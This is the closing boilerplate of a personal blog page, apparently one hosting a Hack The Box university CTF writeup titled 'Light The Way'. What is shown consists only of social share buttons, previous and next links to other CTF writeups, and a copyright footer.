        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.1 3.9C17.9 1.7 15 .5 12 .5 5.8.5.7 5.6.7 11.9c0 2 .5 3.9 1.5 5.6L.6 23.4l6-1.6c1.6.9 3.5 1.3 5.4 1.3 6.3 0 11.4-5.1 11.4-11.4-.1-2.8-1.2-5.7-3.3-7.8zM12 21.4c-1.7 0-3.3-.5-4.8-1.3l-.4-.2-3.5 1 1-3.4L4 17c-1-1.5-1.4-3.2-1.4-5.1 0-5.2 4.2-9.4 9.4-9.4 2.5 0 4.9 1 6.7 2.8 1.8 1.8 2.8 4.2 2.8 6.7-.1 5.2-4.3 9.4-9.5 9.4zm5.1-7.1c-.3-.1-1.7-.9-1.9-1-.3-.1-.5-.1-.7.1-.2.3-.8 1-.9 1.1-.2.2-.3.2-.6.1s-1.2-.5-2.3-1.4c-.9-.8-1.4-1.7-1.6-2-.2-.3 0-.5.1-.6s.3-.3.4-.5c.2-.1.3-.3.4-.5.1-.2 0-.4 0-.5C10 9 9.3 7.6 9 7c-.1-.4-.4-.3-.5-.3h-.6s-.4.1-.7.3c-.3.3-1 1-1 2.4s1 2.8 1.1 3c.1.2 2 3.1 4.9 4.3.7.3 1.2.5 1.6.6.7.2 1.3.2 1.8.1.6-.1 1.7-.7 1.9-1.3.2-.7.2-1.2.2-1.3-.1-.3-.3-.4-.6-.5z"/></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f&amp;t=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 140"><path fill-rule="evenodd" d="M60.94 82.314L17 0h20.08l25.85 52.093c.397.927.86 1.888 1.39 2.883.53.994.995 2.02 1.393 3.08.265.4.463.764.596 1.095.13.334.262.63.395.898.662 1.325 1.26 2.618 1.79 3.877.53 1.26.993 2.42 1.39 3.48 1.06-2.254 2.22-4.673 3.48-7.258 1.26-2.585 2.552-5.27 3.877-8.052L103.49 0h18.69L77.84 83.308v53.087h-16.9v-54.08z"></path></svg>
        </div>
      </div>
    </a>
    

    
    
    <a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20UNI%20CTF%20%3a%20Light%20The%20Way&amp;url=%2f%2flocalhost%3a1313%2fposts%2fwriteups%2fhtb-uni-ctf%2flighttheway%2f" target="_blank" rel="noopener" aria-label="">
      <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.707 8.475C.275 8.64 0 9.508 0 9.508s.284.867.718 1.03l5.09 1.897 1.986 6.38a1.102 1.102 0 0 0 1.75.527l2.96-2.41a.405.405 0 0 1 .494-.013l5.34 3.87a1.1 1.1 0 0 0 1.046.135 1.1 1.1 0 0 0 .682-.803l3.91-18.795A1.102 1.102 0 0 0 22.5.075L.706 8.475z"/></svg>
        </div>
      </div>
    </a>
    
</div>
  <div class="paginator">
    
    <a class="link" href="//localhost:1313/posts/writeups/k3rn3lctf/integrity-check/" title="Integrity Check">← prev</a>
    
    
    <a class="link" href="//localhost:1313/posts/writeups/htb-uni-ctf/web-slippy/" title="HTB UNI CTF : Web Slippy">next →</a>
    
  </div>
  <div class="comment">
    
    
    
    
  </div>
  
  
</main>

    <footer id="footer">
  <div>
    <span></span>
  </div>
  <div>
    <span>Copyright © 2024 Yojan Gautam</span>
  </div>
</footer>

  </div>

  
  <script src='//localhost:1313/js/script.js' defer></script>

  
  

  
  

  
  
  



</body>

</html>
